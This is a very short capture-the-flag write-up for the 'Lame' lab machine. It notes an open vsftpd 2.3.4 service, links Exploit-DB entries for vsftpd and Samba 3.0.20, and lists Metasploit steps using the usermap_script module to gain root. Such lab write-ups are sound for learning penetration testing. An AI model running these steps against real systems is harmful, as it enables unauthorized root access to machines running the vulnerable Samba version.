# LAME 

```
21/tcp  open  ftp         vsftpd 2.3.4
```
there is an exploit for vsftpd 2.3.4
```
https://www.exploit-db.com/exploits/49757
```
but it doesnt work 

smbd 3.0.20 has also a CVE 
```
https://www.exploit-db.com/exploits/16320
```

so lets 
- msfconsole  
- use exploit/multi/samba/usermap_script

set LHOST RHOSTS LPORT and run 

we are already root
